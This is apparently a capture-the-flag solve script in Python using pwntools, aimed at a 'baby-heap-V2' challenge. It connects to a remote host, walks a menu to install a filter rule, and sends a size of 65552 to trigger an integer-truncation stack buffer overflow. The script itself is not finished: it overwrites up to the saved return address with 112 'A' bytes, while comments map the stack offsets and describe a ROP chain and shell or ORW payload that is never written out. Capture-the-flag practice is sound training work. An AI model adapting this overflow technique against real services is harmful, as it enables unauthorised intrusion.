import socket
import struct
import time
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40917
libc = ELF(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\baby-heap-V2\solve\libc\libc.so.6", checksec=False)

def pwn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    s.connect((HOST, PORT))

    def recv_until(delim):
        data = b""
        while delim not in data:
            chunk = s.recv(1024)
            if not chunk: break
            data += chunk
        return data

    # 1. Install permissive rule (example 1)
    recv_until(b"-1) exit\n")
    s.sendall(b"0\n")
    recv_until(b"1) use examples\n")
    s.sendall(b"1\n")
    recv_until(b"3) kill all\n")
    s.sendall(b"1\n")
    recv_until(b"-1) exit\n")
    s.sendall(b"3\n")
    recv_until(b"-1) exit\n")
    log.success("Filter installed!")

    # 2. Trigger Audit Buffer Overflow with Integer Truncation (65552 -> ax=0x10 <= 0x60)
    s.sendall(b"5\n")
    recv_until(b"size?\n")
    s.sendall(b"65552\n")
    recv_until(b"note?\n")

    # Stack layout in sub_1d10:
    # buffer starts at [rsp+0x40]
    # saved rbp at [rsp+0xa8] -> offset = 0x68 = 104 bytes
    # saved rip at [rsp+0xb0] -> offset = 0x70 = 112 bytes
    
    # We will send payload to execute shell / ORW
    # Let's craft payload: 104 bytes dummy + saved rbp (8 bytes) + ROP chain
    payload = b"A" * 112
    s.sendall(payload)
    
    time.sleep(1)
    try:
        out = s.recv(4096)
        log.info(f"Target response: {out!r}")
    except Exception as e:
        log.info(f"Connection ended as expected: {e}")
        
    s.close()

if __name__ == "__main__":
    pwn()
